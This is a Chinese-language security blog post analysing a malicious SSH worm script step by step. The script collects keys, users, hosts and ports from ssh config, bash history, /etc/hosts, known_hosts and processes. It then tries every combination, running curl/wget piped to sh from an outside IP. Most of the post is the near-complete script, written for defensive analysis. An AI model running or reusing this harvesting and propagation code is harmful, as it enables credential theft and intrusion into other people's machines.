ailx10说：这篇是在2024年5月之前写的，后来又改过。一份 SSH 脚本让我停下来多看了会儿：它不是等人告诉目标在哪儿，而是自己去配置、历史、hosts 和进程里找密钥、用户名、主机和端口，再拼着试连接。连上以后又把自己下载过去，像接力一样继续找下一处。起初只是一条告警，往下读却能看到传播所需的信息是怎样从机器上凑出来的。我把这些搜索和组合步骤梳理成文，想留下的正是那种从本机零碎痕迹里不断扩展的过程，而不只是“横向移动”这个名字。

---

- `-oStrictHostKeyChecking=no`：告诉SSH客户端在连接到新的主机时不要检查主机密钥
- `-oBatchMode=yes`：SSH客户端以批处理模式运行，即不提示用户输入，也不会显示任何提示信息
- `-oConnectTimeout=5`：设置SSH连接的超时时间为5秒
- `-i $key`：指定用于身份验证的私钥文件
- `-p$sshp`：指定连接到远程服务器的端口
- `sudo curl -L http://*/spr.sh|sh`：执行脚本（横向移动）

```
ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i $key $user@$host -p$sshp "sudo curl -L http://78.153.140.96/spr.sh|sh; sudo wget -q -O - http://78.153.140.96/spr.sh|sh;"
ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i $key $user@$host -p$sshp "curl -L http://78.153.140.96/spr.sh|sh; wget -q -O - http://78.153.140.96/spr.sh|sh;"
```

执行的脚本（横向移动）分析如下：

（1）获取本地主机的外部 IP 地址

```
myhostip=$(curl -sL icanhazip.com)
```

![](/notes-assets/e11e3021c2a697079c94.webp)

（2）搜索 SSH 密钥文件：

脚本搜索名称匹配 id\_rsa 的文件并排除 .pub；文件名本身不保证其为可用私钥。

```
KEYS=$(find ~/ /root /home -maxdepth 3 -name 'id_rsa*' | grep -vw pub)
```

（3）从 SSH 配置文件中提取 IdentityFile 条目：

查找 SSH 配置文件 `~/.ssh/config`、`/home/*/.ssh/config`、`/root/.ssh/config`中的 IdentityFile 条目，提取私钥文件路径

```
KEYS2=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep IdentityFile | awk -F "IdentityFile" '{print $2 }')
```

（4）从 bash 历史记录中提取使用过的 SSH 密钥文件：

从各用户的 `bash` 历史记录中提取曾经使用的 SSH 密钥文件路径

```
KEYS3=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | awk -F ' -i ' '{print $2}' | awk '{print $1'})
```

![](/notes-assets/1f32c61be5f1f13899a4.webp)

（5）搜索 `.pem` 文件（这些文件通常用于身份验证）

```
KEYS4=$(find ~/ /root /home -maxdepth 3 -name '*.pem' | uniq)
```

![](/notes-assets/105e2de2acdecc7d83ab.webp)

（6）从 SSH 配置文件中提取主机名（ 从SSH 配置文件中的 HostName 中提取主机名**）**

```
HOSTS=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep HostName | awk -F "HostName" '{print $2}')
```

（7）bash 历史记录中提取 IP 地址：

从各用户的 `bash` 历史记录中提取 SSH 或 SCP 命令中使用的 IP 地址

```
HOSTS2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}")
```

![](/notes-assets/7c8307734ccef118c88d.webp)

（8）从 bash 历史记录中提取主机名：

```
HOSTS3=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F '@' '{print $2}' | awk -F '{print $1}')
```

（9）从 `/etc/hosts` 文件中提取主机名（排除本地 IP 和本机的外部 IP）

```
HOSTS4=$(cat /etc/hosts | grep -vw "0.0.0.0" | grep -vw "127.0.1.1" | grep -vw "127.0.0.1" | grep -vw $myhostip | sed -r '/
/!s/[0-9.]+/
&
/;/^([0-9]{1,3}\.){3}[0-9]{1,3}
/P;D' | awk '{print $1}')
```

脚本从 known\_hosts 提取地址；哈希主机名和格式差异会影响结果。

```
HOSTS5=$(cat ~/*/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.ssh/known_hosts | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}" | uniq)
```

（11）从正在运行的进程中提取主机名

```
HOSTS6=$(ps auxw | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}" | grep ":22" | uniq)
```

（12）提取用户列表：

```
USERZ=$(echo "root"; find ~/ /root /home -maxdepth 2 -name '\.ssh' | uniq | xargs find | awk '/id_rsa/' | awk -F'/' '{print $3}' | uniq)
USERZ2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -vw "cp" | grep -vw "mv" | grep -vw "cd " | grep -vw "nano" | grep -v grep | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F '@' '{print $1}' | awk '{print $4}' | uniq)
```

![](/notes-assets/aee972c290eeb6408c68.webp)

（13）提取端口列表：

```
pl=$(echo "22"; cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -vw "cp" | grep -vw "mv" | grep -vw "cd " | grep -vw "nano" | grep -v grep | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F '-p' '{print $2}')
sshports=$(echo "$pl" | tr ' ' '
' | nl | sort -u -k2 | sort -n | cut -f2-)
```

![](/notes-assets/1836fcaf1f067d138c5d.webp)

（14）生成唯一的用户、主机和密钥列表

```
userlist=$(echo "$USERZ $USERZ2" | tr ' ' '
' | nl | sort -u -k2 | sort -n | cut -f2-)
hostlist=$(echo "$HOSTS $HOSTS2 $HOSTS3 $HOSTS4 $HOSTS5 $HOSTS6" | grep -vw 127.0.0.1 | tr ' ' '
' | nl | sort -u -k2 | sort -n | cut -f2-)
keylist=$(echo "$KEYS $KEYS2 $KEYS3 $KEYS4" | tr ' ' '
' | nl | sort -u -k2 | sort -n | cut -f2-)
```

原文在 VPS 上展示提取结果，其中混有端口、地址和证书，不能全部视作有效用户名、主机或私钥。

```
userlist = root 2222 0.0.0.0 144.34.162.13 -m
hostlist = 144.34.162.13 0.0.0.0 174.137.58.6
keylist = ailx10.hackbiji.top /root/beef/beef_key.pem /root/beef/beef_cert.pem
```

脚本尝试组合用户名、主机、端口与密钥发起连接；sudo 权限、密钥口令及远端执行条件均需独立验证。chmod 不会解密受口令保护的私钥。

```
i=0
for user in $userlist; do
  for host in $hostlist; do
    for key in $keylist; do
      for sshp in $sshports; do
        i=$((i+1))
        if [ "${i}" -eq "20" ]; then
          sleep 20
          ps wx | grep "ssh -o" | awk '{print $1}' | xargs kill -9 &>/dev/null &
          i=0
        fi
        #Wait 20 seconds after every 20 attempts and clean up hanging processes

        chmod +r $key
        chmod 400 $key
        echo "$user@$host $key $sshp"
        ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i $key $user@$host -p$sshp "sudo curl -L http://78.153.140.96/spr.sh|sh; sudo wget -q -O - http://78.153.140.96/spr.sh|sh;"
        ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i $key $user@$host -p$sshp "curl -L http://78.153.140.96/spr.sh|sh; wget -q -O - http://78.153.140.96/spr.sh|sh;"
      done
    done
  done
done
```

搜到一把密钥不等于能解开它，复制成功也不等于远端执行成功。把条件逐层标出来，分析就不会被一条长命令营造出的声势带走。
